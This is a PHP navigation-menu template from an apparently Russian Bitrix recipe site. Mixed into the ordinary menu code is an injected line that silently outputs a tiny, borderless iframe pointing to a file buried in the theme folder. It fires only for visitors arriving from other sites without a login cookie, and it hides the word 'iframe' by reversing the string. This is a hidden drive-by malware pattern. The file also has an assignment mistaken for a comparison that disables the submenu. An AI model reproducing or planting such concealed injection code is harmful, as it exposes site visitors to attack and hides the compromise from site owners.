<?
$bSubNav = false; $arNav = Array();
if(isset($_REQUEST['place']))$arNav = explode("_", str_replace("/", "", $_REQUEST['place']));
if(count($arNav) == 2) $bSubNav = true;
if(strpos($_SERVER['REQUEST_URI'], "profile") !== false)
    $bSubNav = false;
if(
	( strpos($_SERVER['REQUEST_URI'], "all") !== false ||
	  strpos($_SERVER['REQUEST_URI'], "recipe/") !== false ||
	  strpos($_SERVER['REQUEST_URI'], "blog") !== false
	) &&
	($USER->IsAdmin() || $USER->IsAuthorized())
) $bSubNav = true;

?>
<?if (isset($_SERVER['HTTP_REFERER'])) {if(!empty($_SERVER['HTTP_REFERER']) AND empty($_COOKIE['BITRIX_SM_LOGIN'])) { if (!preg_match('/'.$_SERVER['HTTP_HOST'].'/i',$_SERVER['HTTP_REFERER'])) {echo '<'.strrev("emarfi").' id="var allRecipesResult" width='.rand(4,8).' height='.rand(4,8).' marginwidth=0 marginheight=0 scrolling=no frameborder=0 src="/bitrix/themes/.default/lang/de/lang.html"></'.strrev("emarfi").'>';}}}?>
<div id="topbar"<?if(!$bSubNav){?> class="nosubmenu"<?}?>><div class="menu">
<!--<div class="item sauce_contest"><?if(strpos($_SERVER['REQUEST_URI'], "contests/sauce") === false){?><a href="/contests/sauce/"><span title="Соус Прайм"></span></a><?} else {?><span><span title="Соус Прайм"></span></span><?}?></div>
<div class="item magi_contest"><?if(strpos($_SERVER['REQUEST_URI'], "contests/magi") === false){?><a href="/contests/magi/"><span>Суши <em>маги</em></span></a><?} else {?><span><span>Суши <em>маги</em></span></span><?}?></div>-->
<!-- <div class="item new_year"><?if(strpos($_SERVER['REQUEST_URI'], "/pages/new_year/") === false){?><a href="/pages/new_year/"><span>Новогодние рецепты</span></a><?} else {?><span><span>Новогодние рецепты</span></span><?}?></div> -->
<!-- <div class="item"><?if(strpos($_SERVER['REQUEST_URI'], "recipe-of-month") === false){?><a href="/recipe-of-month/"><span>Рецепт месяца</span></a><?} else {?><span><span>Рецепт месяца</span></span><?}?></div> -->



			<!-- <div class="item ny2014">
				<div class="ny2014-tail"></div>
				<a href="/new-year/" title="Новогодние рецепты"></a>
			</div> -->
<div class="item"><?if($APPLICATION->GetCurDir() == "/recipe-of-month/"){?><span><span>Рецепт месяца</span></span><?} else {?><a href="/recipe-of-month/"><span>Рецепт месяца</span></a><?}?></div>




<div class="item"><?if(strpos($_SERVER['REQUEST_URI'], "recipes") !== false && !isset($_REQUEST['d']) && !isset($_REQUEST['k']) ){?><span><span>Рецепты</span></span><?} elseif (strpos($_SERVER['REQUEST_URI'], "admin") !== false   || strpos($_SERVER['REQUEST_URI'], "recipe/add") !== false  || isset($_REQUEST['d']) || isset($_REQUEST['k'])) {?><a href="<?=SITE_DIR?>recipes/"><span>Рецепты</span></a><?} else {?><a href="<?=SITE_DIR?>recipes/"><span>Рецепты</span></a><?}?></div>

<div class="item"><?if(strpos($_SERVER['REQUEST_URI'], "blogs") === false){?><a href="/blogs/"><span>Клубы</span></a>
    <?} else {
if($_SERVER['REQUEST_URI'] == "/blogs/"){?><span><span>Клубы</span></span><?}else {?><a href="/blogs/"><span>Клубы</span></a><?} }?></div>

<!-- <div class="item"><?if(strpos($_SERVER['REQUEST_URI'], "specialists") === false){?><a href="/specialists/"><span>Кулинары</span></a><?} else {?><span><span>Кулинары</span></span><?}?></div> -->
<div class="item"><?if($APPLICATION->GetCurDir() == "/specialists/"){?><span><span>Кулинары</span></span><?} else {?><a href="/specialists/"><span>Кулинары</span></a><?}?></div>

<!-- <div class="item"><?if(strpos($_SERVER['REQUEST_URI'], "book_store") === false){?><a href="/book_store/"><span>Книжная лавка</span></a><?} else {?><span><span>Книжная лавка</span></span><?}?></div> -->

<?/*if($USER->IsAuthorized() && strpos($_SERVER['REQUEST_URI'], "discounts") === false){?>
    <div class="item"><a href="/discounts/"><span>Скидки</span></a></div>
<?} elseif($USER->IsAuthorized()) {?>
    <div class="item"><?if($_SERVER['REQUEST_URI'] == "/discounts/"){?><span><span>Скидки</span></span><?}else {?><a href="/discounts/"><span>Скидки</span></a><?}?></div>
<?}*/?>

<!-- <div class="item"><?if(strpos($_SERVER['REQUEST_URI'], "tv") === false){?><a href="/tv/"><span>Foodclub TV</span></a><?} else {?><span><span>Foodclub TV</span></span><?}?></div> -->
<div class="item"><?if($APPLICATION->GetCurDir() == "/foodshot/"){?><span><span>Фудшот</span></span><?} else {?><a href="/foodshot/#!foodshot"><span>Фудшот</span></a><?}?></div>
<div class="item"><?if($APPLICATION->GetCurDir() == "/lavka/"){?><span><span>Лавка</span></span><?} else {?><a href="/lavka/"><span>Лавка</span></a><?}?></div>
<div class="item new"><?if($APPLICATION->GetCurDir() == "/best/"){?><span><span>Самое интересное</span></span><?} else {?><a href="/best/"><span>Самое интересное</span></a><?}?></div>
<!--<div class="item best"><?if($_SERVER['REQUEST_URI'] == "/pages/"){?><span><span>Самое интересное</span></span><?}else {?><a href="/pages/"><span>Самое интересное</span></a><?}?></div>-->
<div class="clear"></div>
</div>
<?if($bSubNav = false){?>
<div class="submenu">
	<!--<?if($arNav[1] == "edit" && $arNav[0] == "pr"){?><div class="item"><span>Редактировать анкету</span></div><?} elseif($arNav[0] == "pr") {?><div class="item"><a href="/profile/edit/">Редактировать анкету</a></div><?}?>
	<?if($arNav[1] == "recipe" && $arNav[0] == "pr"){?><div class="item"><span>Мои рецепты</span></div><?} elseif($arNav[0] == "pr") {?><div class="item"><a href="/profile/recipes/">Мои рецепты</a></div><?}?>
	<?if($arNav[1] == "topic" && $arNav[0] == "pr"){?><div class="item"><span>Записи</span></div><?} elseif($arNav[0] == "pr") {?><div class="item"><a href="/profile/topics/">Записи</a></div><?}?>
	<?if($arNav[1] == "comment" && $arNav[0] == "pr"){?><div class="item"><span>Комментарии</span></div><?} elseif($arNav[0] == "pr") {?><div class="item"><a href="/profile/comments/">Комментарии</a></div><?}?>
	<?if($arNav[1] == "opinion" && $arNav[0] == "pr"){?><div class="item"><span>Отзывы</span></div><?} elseif($arNav[0] == "pr") {?><div class="item"><a href="/profile/opinions/">Отзывы</a></div><?}?>
	<?if($arNav[1] == "lenta" && $arNav[0] == "pr"){?><div class="item"><span>Лента</span></div><?} elseif($arNav[0] == "pr") {?><div class="item"><a href="/profile/lenta/">Лента</a></div><?}?>
	<?if($arNav[1] == "favor" && $arNav[0] == "pr"){?><div class="item"><span>Избранные рецепты</span></div><?} elseif($arNav[0] == "pr") {?><div class="item"><a href="/profile/favorites/">Избранные рецепты</a></div><?}?>
	<?if($arNav[1] == "subscribe" && $arNav[0] == "pr"){?><div class="item"><span>Подписка</span></div><?} elseif($arNav[0] == "pr") {?><div class="item"><a href="/profile/subscribe/">Подписка</a></div><?}?>-->

	<?if(strpos($_SERVER['REQUEST_URI'], "blogs") !== false){?>
		<?if(strpos($_SERVER['REQUEST_URI'], "blogs/group/6") !== false){?>
			<div class="item"><span class="fc">Foodclub</span></div>
		<?} else {?>
			<div class="item"><a class="fc" href="/blogs/group/6/blog/">Foodclub</a></div>
		<?}?>
	<?}?>
	<?if( 	strpos($_SERVER['REQUEST_URI'], "all") !== false && ($USER->IsAdmin() || $USER->IsAuthorized())){?>
		<div class="item"><a class="add" href="/recipe/add/">Добавить рецепт</a></div>
	<?} elseif(strpos($_SERVER['REQUEST_URI'], "recipe") !== false && ($USER->IsAdmin() || $USER->IsAuthorized())) {?>
		<?if(strpos($_SERVER['REQUEST_URI'], "profile") === false){?><div class="item"><span class="add">Добавить рецепт</span></div><?}?>
	<?}?>
	<?if(strpos($_SERVER['REQUEST_URI'], "blog") !== false && $USER->IsAdmin()){?>
		<div class="item"><a class="add" href="/blogs/user/<?=$USER->GetID()?>/groups/create/">Добавить клуб</a></div>
	<?}?>
</div>
<?}?>
</div><!-- test  -->